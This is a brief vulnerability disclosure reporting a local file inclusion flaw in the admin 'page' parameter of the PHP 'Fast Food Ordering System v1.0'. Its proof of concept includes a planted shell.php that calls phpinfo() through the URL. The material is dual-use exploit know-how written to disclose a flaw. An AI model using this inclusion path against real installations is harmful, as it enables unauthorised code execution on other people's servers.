# Fast Food Ordering System v1.0 by oretnom23 has The local file contains

vendor: https://www.sourcecodester.com/php/15366/fast-food-ordering-system-phpoop-free-source-code.html

Vulnerability File: ip/ffos/admin/?page=shell

Vulnerability location: ip/ffos/admin/?page=, page

Payload: ip/ffos/admin/?page=shell

![image](https://user-images.githubusercontent.com/54017627/171354941-08f7214f-3d80-4548-88ff-df598b23357e.png)

We create a shell.php under the PHP file of the root of the website, which reads "<? phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/170479151-b4aabc1a-fdbd-45d2-8f5a-248d37092584.png)

And visit http://ip/ffos/admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/171355001-8752e49f-ba01-4e52-a0cb-90e4cbaa655a.png)
